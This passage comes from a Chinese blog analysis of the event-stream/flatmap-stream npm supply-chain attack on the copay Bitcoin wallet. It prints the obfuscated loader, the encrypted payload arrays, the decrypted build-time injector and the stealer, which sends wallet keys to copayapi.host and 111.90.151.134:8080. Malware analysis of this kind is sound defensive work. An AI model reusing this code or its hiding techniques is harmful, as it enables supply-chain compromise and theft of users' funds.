    var f = new module.constructor;\n        f.paths = module.paths, f[e(n[7])](a, &quot;&quot;), f.exports(n[1])\n    } catch (r) {}\n}();\n</code></pre><p>这段代码其实很短，黑客混淆的方式并不高明，我们可以一步一步还原。</p>\n<ul>\n<li>使用<strong>require</strong>替换变量<strong>r</strong></li>\n<li>使用<strong>process</strong>替换变量<strong>t</strong></li>\n<li>函数<strong>e</strong>任务很简单，就是把16进制字符串转为ASCII字符串，因此更名为hexToAscii</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>!(function() {\n    try {\n        function hexToAscii(r) {\n            return Buffer.from(r, &quot;hex&quot;).toString();\n        }\n        var n = require(hexToAscii(&quot;2e2f746573742f64617461&quot;)),\n            o = process[hexToAscii(n[3])][hexToAscii(n[4])];\n        if (!o) return;\n        var u = require(hexToAscii(n[2]))[hexToAscii(n[6])](\n                hexToAscii(n[5]),\n                o\n            ),\n            a = u.update(n[0], hexToAscii(n[8]), hexToAscii(n[9]));\n        a += u.final(hexToAscii(n[9]));\n        var f = new module.constructor();\n        (f.paths = module.paths), f[hexToAscii(n[7])](a, &quot;&quot;), f.exports(n[1]);\n    } catch (r) {\n        &#x2F;&#x2F; 忽略报错\n    }\n})();\n</code></pre><p>很明显，黑客使用hexToAscii函数是为了混淆代码，比如hexToAscii(“2e2f746573742f64617461”)其实就是**./test/data**，因此数组<strong>n</strong>即为：<a href=\"https://unpkg.com/flatmap-stream@0.1.1/test/data\">https://unpkg.com/flatmap-stream@0.1.1/test/data.js</a>，这个data文件已经找不到了，根据<a href=\"https://github.com/dominictarr/event-stream/issues/116#issue-382854428\">FallingSnow</a>之前的分析，它是一个数组：</p>\n<pre class=\"prettyprint language-javascript\"><code>[\n    &quot;75d4c87f3f69e0fa292969072c49dff4f90f44c1385d8eb60dae4cc3a229e52cf61f78b0822353b4304e323ad563bc22c98421eb6a8c1917e30277f716452ee8d57f9838e00f0c4e4ebd7818653f00e72888a4031676d8e2a80ca3cb00a7396ae3d140135d97c6db00cab172cbf9a92d0b9fb0f73ff2ee4d38c7f6f4b30990f2c97ef39ae6ac6c828f5892dd8457ab530a519cd236ebd51e1703bcfca8f9441c2664903af7e527c420d9263f4af58ccb5843187aa0da1cbb4b6aedfd1bdc6faf32f38a885628612660af8630597969125c917dfc512c53453c96c143a2a058ba91bc37e265b44c5874e594caaf53961c82904a95f1dd33b94e4dd1d00e9878f66dafc55fa6f2f77ec7e7e8fe28e4f959eab4707557b263ec74b2764033cd343199eeb6140a6284cb009a09b143dce784c2cd40dc320777deea6fbdf183f787fa7dd3ce2139999343b488a4f5bcf3743eecf0d30928727025ff3549808f7f711c9f7614148cf43c8aa7ce9b3fcc1cff4bb0df75cb2021d0f4afe5784fa80fed245ee3f0911762fffbc36951a78457b94629f067c1f12927cdf97699656f4a2c4429f1279c4ebacde10fa7a6f5c44b14bc88322a3f06bb0847f0456e630888e5b6c3f2b8f8489cd6bc082c8063eb03dd665badaf2a020f1448f3ae268c8d176e1d80cc756dc3fa02204e7a2f74b9da97f95644792ee87f1471b4c0d735589fc58b5c98fb21c8a8db551b90ce60d88e3f756cc6c8c4094aeaa12b149463a612ea5ea5425e43f223eb8071d7b991cfdf4ed59a96ccbe5bdb373d8febd00f8c7effa57f06116d850c2d9892582724b3585f1d71de83d54797a0bfceeb4670982232800a9b695d824a7ada3d41e568ecaa6629&quot;,\n    &quot;db67fdbfc39c249c6f338194555a41928413b792ff41855e27752e227ba81571483c631bc659563d071bf39277ac3316bd2e1fd865d5ba0be0bbbef3080eb5f6dfdf43b4a678685aa65f30128f8f36633f05285af182be8efe34a2a8f6c9c6663d4af8414baaccd490d6e577b6b57bf7f4d9de5c71ee6bbffd70015a768218a991e1719b5428354d10449f41bac70e5afb1a3e03a52b89a19d4cc333e43b677f4ec750bf0be23fb50f235dd6019058fbc3077c01d013142d9018b076698536d2536b7a1a6a48f5485871f7dc487419e862b1a7493d840f14e8070c8eff54da8013fd3fe103db2ecebc121f82919efb697c2c47f79516708def7accd883d980d5618efd408c0fd46fd387911d1e72e16cf8842c5fe3477e4b46aa7bb34e3cf9caddfca744b6a21b5457beaccff83fa6fb6e8f3876e4764e0d4b5318e7f3eed34af757eb240615591d5369d4ab1493c8a9c366dfa3981b92405e5ebcbfd5dca2c6f9b8e8890a4635254e1bc26d2f7a986e29fef6e67f9a55b6faec78d54eb08cb2f8ea785713b2ffd694e7562cf2b06d38a0f97d0b546b9a121620b7f9d9ccca51b5e74df4bdd82d2a5e336a1d6452912650cc2e8ffc41bd7aa17ab17f60b2bd0cfc0c35ed82c71c0662980f1242c4523fae7a85ccd5e821fe239bfb33d38df78099fd34f429d75117e39b888344d57290b21732f267c22681e4f640bec9437b756d3002a3135564f1c5947cc7c96e1370db7af6db24c9030fb216d0ac1d9b2ca17cb3b3d5955ffcc3237973685a2c078e10bc6e36717b1324022c8840b9a755cffdef6a4d1880a4b6072fd1eb7aabebb9b949e1e37be6dfb6437c3fd0e6f135bcea65e2a06eb35ff26dcf2b2772f8d0cde8e5fa5eec577e9754f6b044502f8ce8838d36827bd3fe91cccba2a04c3ee90c133352cbad34951fdf21a671a4e3940fd69cfee172df4123a0f678154871afa80f763d78df971a1317200d0ce5304b3f01ace921ea8afb41ec800ab834d81740353101408733fb710e99657554c50a4a8cb0a51477a07d6870b681cdc0be0600d912a0c711dc9442260265d50e269f02eb49da509592e0996d02a36a0ce040fff7bd3be57e97d07e4de0cdb93b7e3ccea422a5a526fb95ea8508ea2a40010f56d4aa96da23e6e9bcbae09dacccdcd8ac6af96a1922266c3795fb0798affaa75b8ae05221612ce45c824d1f6603fe2afd74b9e167736bfffe01a12b9f85912572a291336c693f133efeac881cd09207505ad93967e3b7a8972cdcce208bfa3b9956370795791ca91a8b9deabde26c3ee2adb43e9f7df2df16d4582a4e610b73754e609b1eea936a4d916bf5ed9d627692bcc8ed0933026e9250d16bdaf2b68470608aeaffedcf2be8c4c176bfc620e3f9f17a4a9d8ef9fe46cca41a79878d37423c0fa9f3ee1f4e6d68f029d6cbb5cbc90e7243135e0fc1dd66297d32adabc9a6d0235709be173b688ba2004f518f58f5459caca60d615ae4dc0d0eeacbe48ca8727a8b42dc78396316a0e223029b76311e7607ea5bd236307ba3b62afeff7a1ef5c0b5d7ee760c0f6472359c57817c5d9cd534d9a34bb4847bbc83c37b14b6444e9f386f1bec4b42c65d1078d54bd007ff545028205099abc454919406408b761a1636d10e39ede9f650f25abad3219b9d46d535402b930488535d97d19be3b0e75fed31d0b2f8af099481685e2b4fa9bff05cbac1b9b405db2c7eae68501633e02723560727a1c8c34c32afc76cdeb82fe8bae34b09cd82402076b9f481d043b080d851c7b6ba8613adba3bc3d5edb9a84fce41130ad328fe4c062a76966cb60c4fa801f359d22b70a797a2c2a3d19da7383025cb2e076b9c30b862456ae4b60197101e82133748c224a1431545fde146d98723ccb79b47155b218914c76f5d52027c06c6c913450fc56527a34c3fe1349f38018a55910de819add6204ab2829668ca0b7afb0d00f00c873a3f18daad9ae662b09c775cddbe98b9e7a43f1f8318665027636d1de18b5a77f548e9ede3b73e3777c44ec962fb7a94c56d8b34c1da603b3fc250799aad48cc007263daf8969dbe9f8ade2ac66f5b66657d8b56050ff14d8f759dd2c7c0411d92157531cfc3ac9c981e327fd6b140fb2abf994fa91aecc2c4fef5f210f52d487f117873df6e847769c06db7f8642cd2426b6ce00d6218413fdbba5bbbebc4e94bffdef6985a0e800132fe5821e62f2c1d79ddb5656bd5102176d33d79cf4560453ca7fd3d3c3be0190ae356efaaf5e2892f0d80c437eade2d28698148e72fbe17f1fac993a1314052345b701d65bb0ea3710145df687bb17182cd3ad6c121afef20bf02e0100fd63cbbf498321795372398c983eb31f184fa1adbb24759e395def34e1a726c3604591b67928da6c6a8c5f96808edfc7990a585411ffe633bae6a3ed6c132b1547237cab6f3b24c57d3d4cd8e2fbbd9f7674ececf0f66b39c2591330acc1ac20732a98e9b61a3fd979f88ab7211acbf629fcb0c80fb5ed1ea55df0735dcf13510304652763a5ed7bde3e5ebda1bf72110789ebefa469b70f6b4add29ce1471fa6972df108717100412c804efcf8aaba277f0107b1c51f15f144ab02dd8f334d5b48caf24a4492979fa425c4c25c4d213408ecfeb82f34e7d20f26f65fa4e89db57582d6a928914ee6fc0c6cc0a9793aa032883ea5a2d2135dbfcf762f4a2e22585966be376d30fbfabb1dfd182e7b174097481763c04f5d7cbd060c5a36dc0e3dd235de1669f3db8747d5b74d8c1cc9ab3a919e257fb7e6809f15ab7c2506437ced02f03416a1240a555f842a11cde514c450a2f8536f25c60bbe0e1b013d8dd407e4cb171216e30835af7ca0d9e3ff33451c6236704b814c800ecc6833a0e66cd2c487862172bc8a1acb7786ddc4e05ba4e41ada15e0d6334a8bf51373722c26b96bbe4d704386469752d2cda5ca73f7399ff0df165abb720810a4dc19f76ca748a34cb3d0f9b0d800d7657f702284c6e818080d4d9c6fff481f76fb7a7c5d513eae7aa84484822f98a183e192f71ea4e53a45415ddb03039549b18bc6e1&quot;,\n    &quot;63727970746f&quot;,\n    &quot;656e76&quot;,\n    &quot;6e706d5f7061636b6167655f6465736372697074696f6e&quot;,\n    &quot;616573323536&quot;,\n    &quot;6372656174654465636970686572&quot;,\n    &quot;5f636f6d70696c65&quot;,\n    &quot;686578&quot;,\n    &quot;75746638&quot;\n]\n</code></pre><p>数组<strong>n</strong>中一共有10个元素，除了前面2个元素，其他元素在代码中均通过hexToAscii函数进行了转换，其转换结果如下:</p>\n<ul>\n<li>hexToAscii(n[2]): crypto</li>\n<li>hexToAscii(n[3]): env</li>\n<li>hexToAscii(n[4]): npm_package_description</li>\n<li>hexToAscii(n[5]): aes256</li>\n<li>hexToAscii(n[6]): createDecipher</li>\n<li>hexToAscii(n[7]): _compile</li>\n<li>hexToAscii(n[8]): hex</li>\n<li>hexToAscii(n[9]): utf8</li>\n</ul>\n<p>将这些值全部替换掉，代码如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>!(function() {\n    try {\n        var n = [\n            &quot;75d4c87f3f69e0fa292969072c49dff4f90f44c1385d8eb60dae4cc3a229e52cf61f78b0822353b4304e323ad563bc22c98421eb6a8c1917e30277f716452ee8d57f9838e00f0c4e4ebd7818653f00e72888a4031676d8e2a80ca3cb00a7396ae3d140135d97c6db00cab172cbf9a92d0b9fb0f73ff2ee4d38c7f6f4b30990f2c97ef39ae6ac6c828f5892dd8457ab530a519cd236ebd51e1703bcfca8f9441c2664903af7e527c420d9263f4af58ccb5843187aa0da1cbb4b6aedfd1bdc6faf32f38a885628612660af8630597969125c917dfc512c53453c96c143a2a058ba91bc37e265b44c5874e594caaf53961c82904a95f1dd33b94e4dd1d00e9878f66dafc55fa6f2f77ec7e7e8fe28e4f959eab4707557b263ec74b2764033cd343199eeb6140a6284cb009a09b143dce784c2cd40dc320777deea6fbdf183f787fa7dd3ce2139999343b488a4f5bcf3743eecf0d30928727025ff3549808f7f711c9f7614148cf43c8aa7ce9b3fcc1cff4bb0df75cb2021d0f4afe5784fa80fed245ee3f0911762fffbc36951a78457b94629f067c1f12927cdf97699656f4a2c4429f1279c4ebacde10fa7a6f5c44b14bc88322a3f06bb0847f0456e630888e5b6c3f2b8f8489cd6bc082c8063eb03dd665badaf2a020f1448f3ae268c8d176e1d80cc756dc3fa02204e7a2f74b9da97f95644792ee87f1471b4c0d735589fc58b5c98fb21c8a8db551b90ce60d88e3f756cc6c8c4094aeaa12b149463a612ea5ea5425e43f223eb8071d7b991cfdf4ed59a96ccbe5bdb373d8febd00f8c7effa57f06116d850c2d9892582724b3585f1d71de83d54797a0bfceeb4670982232800a9b695d824a7ada3d41e568ecaa6629&quot;,\n            &quot;db67fdbfc39c249c6f338194555a41928413b792ff41855e27752e227ba81571483c631bc659563d071bf39277ac3316bd2e1fd865d5ba0be0bbbef3080eb5f6dfdf43b4a678685aa65f30128f8f36633f05285af182be8efe34a2a8f6c9c6663d4af8414baaccd490d6e577b6b57bf7f4d9de5c71ee6bbffd70015a768218a991e1719b5428354d10449f41bac70e5afb1a3e03a52b89a19d4cc333e43b677f4ec750bf0be23fb50f235dd6019058fbc3077c01d013142d9018b076698536d2536b7a1a6a48f5485871f7dc487419e862b1a7493d840f14e8070c8eff54da8013fd3fe103db2ecebc121f82919efb697c2c47f79516708def7accd883d980d5618efd408c0fd46fd387911d1e72e16cf8842c5fe3477e4b46aa7bb34e3cf9caddfca744b6a21b5457beaccff83fa6fb6e8f3876e4764e0d4b5318e7f3eed34af757eb240615591d5369d4ab1493c8a9c366dfa3981b92405e5ebcbfd5dca2c6f9b8e8890a4635254e1bc26d2f7a986e29fef6e67f9a55b6faec78d54eb08cb2f8ea785713b2ffd694e7562cf2b06d38a0f97d0b546b9a121620b7f9d9ccca51b5e74df4bdd82d2a5e336a1d6452912650cc2e8ffc41bd7aa17ab17f60b2bd0cfc0c35ed82c71c0662980f1242c4523fae7a85ccd5e821fe239bfb33d38df78099fd34f429d75117e39b888344d57290b21732f267c22681e4f640bec9437b756d3002a3135564f1c5947cc7c96e1370db7af6db24c9030fb216d0ac1d9b2ca17cb3b3d5955ffcc3237973685a2c078e10bc6e36717b1324022c8840b9a755cffdef6a4d1880a4b6072fd1eb7aabebb9b949e1e37be6dfb6437c3fd0e6f135bcea65e2a06eb35ff26dcf2b2772f8d0cde8e5fa5eec577e9754f6b044502f8ce8838d36827bd3fe91cccba2a04c3ee90c133352cbad34951fdf21a671a4e3940fd69cfee172df4123a0f678154871afa80f763d78df971a1317200d0ce5304b3f01ace921ea8afb41ec800ab834d81740353101408733fb710e99657554c50a4a8cb0a51477a07d6870b681cdc0be0600d912a0c711dc9442260265d50e269f02eb49da509592e0996d02a36a0ce040fff7bd3be57e97d07e4de0cdb93b7e3ccea422a5a526fb95ea8508ea2a40010f56d4aa96da23e6e9bcbae09dacccdcd8ac6af96a1922266c3795fb0798affaa75b8ae05221612ce45c824d1f6603fe2afd74b9e167736bfffe01a12b9f85912572a291336c693f133efeac881cd09207505ad93967e3b7a8972cdcce208bfa3b9956370795791ca91a8b9deabde26c3ee2adb43e9f7df2df16d4582a4e610b73754e609b1eea936a4d916bf5ed9d627692bcc8ed0933026e9250d16bdaf2b68470608aeaffedcf2be8c4c176bfc620e3f9f17a4a9d8ef9fe46cca41a79878d37423c0fa9f3ee1f4e6d68f029d6cbb5cbc90e7243135e0fc1dd66297d32adabc9a6d0235709be173b688ba2004f518f58f5459caca60d615ae4dc0d0eeacbe48ca8727a8b42dc78396316a0e223029b76311e7607ea5bd236307ba3b62afeff7a1ef5c0b5d7ee760c0f6472359c57817c5d9cd534d9a34bb4847bbc83c37b14b6444e9f386f1bec4b42c65d1078d54bd007ff545028205099abc454919406408b761a1636d10e39ede9f650f25abad3219b9d46d535402b930488535d97d19be3b0e75fed31d0b2f8af099481685e2b4fa9bff05cbac1b9b405db2c7eae68501633e02723560727a1c8c34c32afc76cdeb82fe8bae34b09cd82402076b9f481d043b080d851c7b6ba8613adba3bc3d5edb9a84fce41130ad328fe4c062a76966cb60c4fa801f359d22b70a797a2c2a3d19da7383025cb2e076b9c30b862456ae4b60197101e82133748c224a1431545fde146d98723ccb79b47155b218914c76f5d52027c06c6c913450fc56527a34c3fe1349f38018a55910de819add6204ab2829668ca0b7afb0d00f00c873a3f18daad9ae662b09c775cddbe98b9e7a43f1f8318665027636d1de18b5a77f548e9ede3b73e3777c44ec962fb7a94c56d8b34c1da603b3fc250799aad48cc007263daf8969dbe9f8ade2ac66f5b66657d8b56050ff14d8f759dd2c7c0411d92157531cfc3ac9c981e327fd6b140fb2abf994fa91aecc2c4fef5f210f52d487f117873df6e847769c06db7f8642cd2426b6ce00d6218413fdbba5bbbebc4e94bffdef6985a0e800132fe5821e62f2c1d79ddb5656bd5102176d33d79cf4560453ca7fd3d3c3be0190ae356efaaf5e2892f0d80c437eade2d28698148e72fbe17f1fac993a1314052345b701d65bb0ea3710145df687bb17182cd3ad6c121afef20bf02e0100fd63cbbf498321795372398c983eb31f184fa1adbb24759e395def34e1a726c3604591b67928da6c6a8c5f96808edfc7990a585411ffe633bae6a3ed6c132b1547237cab6f3b24c57d3d4cd8e2fbbd9f7674ececf0f66b39c2591330acc1ac20732a98e9b61a3fd979f88ab7211acbf629fcb0c80fb5ed1ea55df0735dcf13510304652763a5ed7bde3e5ebda1bf72110789ebefa469b70f6b4add29ce1471fa6972df108717100412c804efcf8aaba277f0107b1c51f15f144ab02dd8f334d5b48caf24a4492979fa425c4c25c4d213408ecfeb82f34e7d20f26f65fa4e89db57582d6a928914ee6fc0c6cc0a9793aa032883ea5a2d2135dbfcf762f4a2e22585966be376d30fbfabb1dfd182e7b174097481763c04f5d7cbd060c5a36dc0e3dd235de1669f3db8747d5b74d8c1cc9ab3a919e257fb7e6809f15ab7c2506437ced02f03416a1240a555f842a11cde514c450a2f8536f25c60bbe0e1b013d8dd407e4cb171216e30835af7ca0d9e3ff33451c6236704b814c800ecc6833a0e66cd2c487862172bc8a1acb7786ddc4e05ba4e41ada15e0d6334a8bf51373722c26b96bbe4d704386469752d2cda5ca73f7399ff0df165abb720810a4dc19f76ca748a34cb3d0f9b0d800d7657f702284c6e818080d4d9c6fff481f76fb7a7c5d513eae7aa84484822f98a183e192f71ea4e53a45415ddb03039549b18bc6e1&quot;\n        ];\n        var o = process[&quot;env&quot;][&quot;npm_package_description&quot;];\n        if (!o) return;\n        var u = require(&quot;crypto&quot;)[&quot;createDecipher&quot;](&quot;aes256&quot;, o),\n            a = u.update(n[0], &quot;hex&quot;, &quot;utf8&quot;);\n        a += u.final(&quot;utf8&quot;);\n        var f = new module.constructor();\n        (f.paths = module.paths), f[&quot;_compile&quot;](a, &quot;&quot;), f.exports(n[1]);\n    } catch (r) {\n        &#x2F;&#x2F; 忽略报错\n    }\n})();\n</code></pre><p>代码中使用了<a href=\"https://nodejs.org/api/crypto.html#crypto_crypto_createdecipher_algorithm_password_options\">crypto.createDecipher</a>函数，其文档如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>crypto.createDecipher(algorithm, password)\n&#x2F;&#x2F; Creates and returns a Decipher object that uses the given algorithm and password\n</code></pre><p>可知，代码将项目的npm_package_description作为密码来解密<strong>n[0]<strong>字符串，而<a href=\"https://github.com/bitpay/copay\">copay</a>项目的<a href=\"https://github.com/bitpay/copay/blob/cd3f2b380588e6bc90e6c498bf9ae075bcc59e34/package.json\">package.json</a>的<a href=\"https://github.com/bitpay/copay/blob/cd3f2b380588e6bc90e6c498bf9ae075bcc59e34/package.json#L3\">description</a>属性是</strong>&quot;A Secure Bitcoin Wallet&quot;</strong>，&quot;恰好&quot;可以成功解密n[0]字符串，<a href=\"https://unminify.com/\">unminify</a>之后如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;*@@*&#x2F;\nmodule.exports = function(e) {\n    try {\n        if (!&#x2F;build\\:.*\\-release&#x2F;.test(process.argv[2])) return;\n        var t = process.env.npm_package_description,\n            r = require(&quot;fs&quot;),\n            i = &quot;.&#x2F;node_modules&#x2F;@zxing&#x2F;library&#x2F;esm5&#x2F;core&#x2F;common&#x2F;reedsolomon&#x2F;ReedSolomonDecoder.js&quot;,\n            n = r.statSync(i),\n            c = r.readFileSync(i, &quot;utf8&quot;),\n            o = require(&quot;crypto&quot;).createDecipher(&quot;aes256&quot;, t),\n            s = o.update(e, &quot;hex&quot;, &quot;utf8&quot;);\n        s = &quot;\\n&quot; + (s += o.final(&quot;utf8&quot;));\n        var a = c.indexOf(&quot;\\n&#x2F;*@@*&#x2F;&quot;);\n        0 &lt;= a &amp;&amp; (c = c.substr(0, a)), r.writeFileSync(i, c + s, &quot;utf8&quot;), r.utimesSync(i, n.atime, n.mtime), process.on(&quot;exit&quot;, function() {\n            try {\n                r.writeFileSync(i, c, &quot;utf8&quot;), r.utimesSync(i, n.atime, n.mtime)\n            } catch (e) {}\n        })\n    } catch (e) {}\n};\n</code></pre><p>我们在解密的代码中看到了完全一样的套路，只是这次解密的是<strong>n[1]</strong>，<a href=\"https://unminify.com/\">unminify</a>之后如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;*@@*&#x2F; ! function() {\n    function e() {\n        try {\n            var o = require(&quot;http&quot;),\n                a = require(&quot;crypto&quot;),\n                c = &quot;-----BEGIN PUBLIC KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxoV1GvDc2FUsJnrAqR4C\\nDXUs&#x2F;peqJu00casTfH442yVFkMwV59egxxpTPQ1YJxnQEIhiGte6KrzDYCrdeBfj\\nBOEFEze8aeGn9FOxUeXYWNeiASyS6Q77NSQVk1LW+&#x2F;BiGud7b77Fwfq372fUuEIk\\n2P&#x2F;pUHRoXkBymLWF1nf0L7RIE7ZLhoEBi2dEIP05qGf6BJLHPNbPZkG4grTDv762\\nPDBMwQsCKQcpKDXw&#x2F;6c8gl5e2XM7wXhVhI2ppfoj36oCqpQrkuFIOL2SAaIewDZz\\nLlapGCf2c2QdrQiRkY8LiUYKdsV2XsfHPb327Pv3Q246yULww00uOMl&#x2F;cJ&#x2F;x76To\\n2wIDAQAB\\n-----END PUBLIC KEY-----&quot;;\n\n            function i(e, t, n) {\n                e = Buffer.from(e, &quot;hex&quot;).toString();\n                var r = o.request({\n                    hostname: e,\n                    port: 8080,\n                    method: &quot;POST&quot;,\n                    path: &quot;&#x2F;&quot; + t,\n                    headers: {\n                        &quot;Content-Length&quot;: n.length,\n                        &quot;Content-Type&quot;: &quot;text&#x2F;html&quot;\n                    }\n                }, function() {});\n                r.on(&quot;error&quot;, function(e) {}), r.write(n), r.end()\n            }\n\n            function r(e, t) {\n                for (var n = &quot;&quot;, r = 0; r &lt; t.length; r += 200) {\n                    var o = t.substr(r, 200);\n                    n += a.publicEncrypt(c, Buffer.from(o, &quot;utf8&quot;)).toString(&quot;hex&quot;) + &quot;+&quot;\n                }\n                i(&quot;636f7061796170692e686f7374&quot;, e, n), i(&quot;3131312e39302e3135312e313334&quot;, e, n)\n            }\n\n            function l(t, n) {\n                if (window.cordova) try {\n                    var e = cordova.file.dataDirectory;\n                    resolveLocalFileSystemURL(e, function(e) {\n                        e.getFile(t, {\n                            create: !1\n                        }, function(e) {\n                            e.file(function(e) {\n                                var t = new FileReader;\n                                t.onloadend = function() {\n                                    return n(JSON.parse(t.result))\n                                }, t.onerror = function(e) {\n                                    t.abort()\n                                }, t.readAsText(e)\n                            })\n                        })\n                    })\n                } catch (e) {} else {\n                    try {\n                        var r = localStorage.getItem(t);\n                        if (r) return n(JSON.parse(r))\n                    } catch (e) {}\n                    try {\n                        chrome.storage.local.get(t, function(e) {\n                            if (e) return n(JSON.parse(e[t]))\n                        })\n                    } catch (e) {}\n                }\n            }\n            global.CSSMap = {}, l(&quot;profile&quot;, function(e) {\n                for (var t in e.credentials) {\n                    var n = e.credentials[t];\n                    &quot;livenet&quot; == n.network &amp;&amp; l(&quot;balanceCache-&quot; + n.walletId, function(e) {\n                        var t = this;\n                        t.balance = parseFloat(e.balance.split(&quot; &quot;)[0]), &quot;btc&quot; == t.coin &amp;&amp; t.balance &lt; 100 || &quot;bch&quot; == t.coin &amp;&amp; t.balance &lt; 1e3 || (global.CSSMap[t.xPubKey] = !0, r(&quot;c&quot;, JSON.stringify(t)))\n                    }.bind(n))\n                }\n            });\n            var e = require(&quot;bitcore-wallet-client&#x2F;lib&#x2F;credentials.js&quot;);\n            e.prototype.getKeysFunc = e.prototype.getKeys, e.prototype.getKeys = function(e) {\n                var t = this.getKeysFunc(e);\n                try {\n                    global.CSSMap &amp;&amp; global.CSSMap[this.xPubKey] &amp;&amp; (delete global.CSSMap[this.xPubKey], r(&quot;p&quot;, e + &quot;\\t&quot; + this.xPubKey))\n                } catch (e) {}\n                return t\n            }\n        } catch (e) {}\n    }\n    window.cordova ? document.addEventListener(&quot;deviceready&quot;, e) : e()\n}();\n</code></pre><p>这段代码才是真正窃取比特币的代码，我们稍后再分析。</p>\n<h3>黑客是如何隐藏黑客代码的？</h3>\n<ul>\n<li>黑客一共隐藏了3段代码；</li>\n<li>第1段代码隐藏在<a href=\"https://www.npmjs.com/package/flatmap-stream\">flatmap-stream</a>的<a href=\"https://unpkg.com/flatmap-stream@0.1.1/index.min.js\">index.min.js</a>结尾，代码中使用了16进制字符串来隐藏正真使用的字符串；</li>\n<li>第2段代码隐藏在<a href=\"https://www.npmjs.com/package/flatmap-stream\">flatmap-stream</a>的<strong>test/data</strong>的数组中，需要使用<a href=\"https://github.com/bitpay/copay\">copay</a>项目的<a href=\"https://github.com/bitpay/copay/blob/cd3f2b380588e6bc90e6c498bf9ae075bcc59e34/package.json#L3\">description</a>字符串才能解密，它在第1段代码中解密；</li>\n<li>第3段代码也隐藏在<a href=\"https://www.npmjs.com/package/flatmap-stream\">flatmap-stream</a>的<strong>test/data</strong>的数组中，需要使用<a href=\"https://github.com/bitpay/copay\">copay</a>项目的<a href=\"https://github.com/bitpay/copay/blob/cd3f2b380588e6bc90e6c498bf9ae075bcc59e34/package.json#L3\">description</a>字符串才能解密，它在第2段代码中解密；</li>\n<li>正真窃取比特币钱包<a href=\"https://github.com/bitpay/copay\">copay</a>的是第3段代码；</li>\n<li>第2段和第3段代码刚好需要使用<a href=\"https://github.com/bitpay/copay\">copay</a>中的description字符串**“A Secure Bitcoin Wallet”**才能解密，可知黑客攻击的目标就是<a href=\"https://github.com/bitpay/copay\">copay</a>项目；</li>\n<li>黑客多处使用了**Buffer.from(str, “hex”).toString()**来混淆代码，将ASCII字符串转换为16进制字符串，使我们难以读懂代码；</li>\n<li>黑客2次使用了AES256算法加密黑客代码，如果找不到解密的密码，就不可能知道黑客到底是攻击哪个项目，也不知道他干了什么。 <a href=\"https://github.com/dominictarr/event-stream/issues/116#issuecomment-441744514\">maths22</a>成功<a href=\"https://github.com/dominictarr/event-stream/issues/116#issuecomment-441744514\">找到</a>了密码&quot;A Secure Bitcoin Wallet&quot;以及被攻击的项目<a href=\"https://github.com/bitpay/copay\">copay</a>；</li>\n<li>黑客把所有黑客代码都写在了try…catch里面，否则抛出莫名其妙的错误很容易暴露；(这里从另一个角度证明了监控代码错误的重要性，欢迎大家免费试用<a href=\"https://www.fundebug.com/\">Fundebug</a>)</li>\n</ul>\n<h3>黑客是如何窃取比特币的</h3>\n<p>我分析并且简化了黑客的第3段代码，如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;*global cordova resolveLocalFileSystemURL chrome*&#x2F;\n!(function() {\n    var http = require(&quot;http&quot;);\n    var crypto = require(&quot;crypto&quot;);\n    &#x2F;&#x2F; 黑客的公钥，用于加密窃取的数据，这样只有黑客的公钥可以解密\n    var publicKey =\n        &quot;-----BEGIN PUBLIC KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxoV1GvDc2FUsJnrAqR4C\\nDXUs&#x2F;peqJu00casTfH442yVFkMwV59egxxpTPQ1YJxnQEIhiGte6KrzDYCrdeBfj\\nBOEFEze8aeGn9FOxUeXYWNeiASyS6Q77NSQVk1LW+&#x2F;BiGud7b77Fwfq372fUuEIk\\n2P&#x2F;pUHRoXkBymLWF1nf0L7RIE7ZLhoEBi2dEIP05qGf6BJLHPNbPZkG4grTDv762\\nPDBMwQsCKQcpKDXw&#x2F;6c8gl5e2XM7wXhVhI2ppfoj36oCqpQrkuFIOL2SAaIewDZz\\nLlapGCf2c2QdrQiRkY8LiUYKdsV2XsfHPb327Pv3Q246yULww00uOMl&#x2F;cJ&#x2F;x76To\\n2wIDAQAB\\n-----END PUBLIC KEY-----&quot;;\n\n    &#x2F;&#x2F; 将窃取的数据发送到黑客的服务器\n    function httpRequest(hostname, path, data) {\n        var request = http.request(\n            {\n                hostname: hostname,\n                port: 8080,\n                method: &quot;POST&quot;,\n                path: &quot;&#x2F;&quot; + path,\n                headers: {\n                    &quot;Content-Length&quot;: data.length,\n                    &quot;Content-Type&quot;: &quot;text&#x2F;html&quot;\n                }\n            },\n            function() {}\n        );\n        request.on(&quot;error&quot;, function() {});\n        request.write(data);\n        request.end();\n    }\n\n    &#x2F;&#x2F; 用户密码发送至http:&#x2F;&#x2F;111.90.151.134:8080&#x2F;p\n    &#x2F;&#x2F; 用户其他信息发送至http:&#x2F;&#x2F;111.90.151.134:8080&#x2F;c\n    function sendToHacker(path, t) {\n        &#x2F;&#x2F; 黑客对数据进行了简单的编码以及加密\n        for (var n = &quot;&quot;, r = 0; r &lt; t.length; r += 200) {\n            var o = t.substr(r, 200);\n            &#x2F;&#x2F; 使用黑客的公钥对窃取的数据进行加密\n            n +=\n                crypto\n                    .publicEncrypt(publicKey, Buffer.from(o, &quot;utf8&quot;))\n                    .toString(&quot;hex&quot;) + &quot;+&quot;;\n        }\n        httpRequest(&quot;copayapi.host&quot;, path, n);\n        httpRequest(&quot;111.90.151.134&quot;, path, n);\n    }\n\n    &#x2F;&#x2F; 窃取用户信息\n    function getUserInfo(type, n) {\n        if (window.cordova) {\n            var e = cordova.file.dataDirectory;\n            resolveLocalFileSystemURL(e, function(e) {\n                e.getFile(\n                    type,\n                    {\n                        create: !1\n                    },\n                    function(e) {\n                        e.file(function(e) {\n                            var t = new FileReader();\n                            (t.onloadend = function() {\n                                return n(JSON.parse(t.result));\n                            }),\n                                (t.onerror = function() {\n                                    t.abort();\n                                }),\n                                t.readAsText(e);\n                        });\n                    }\n                );\n            });\n        } else {\n            var r = localStorage.getItem(type);\n            if (r) return n(JSON.parse(r));\n\n            chrome.storage.local.get(type, function(e) {\n                if (e) return n(JSON.parse(e[type]));\n            });\n        }\n    }\n\n    function steal() {\n        var ifSteal = false;\n        &#x2F;&#x2F; 窃取将用户的隐私信息，比如私钥\n        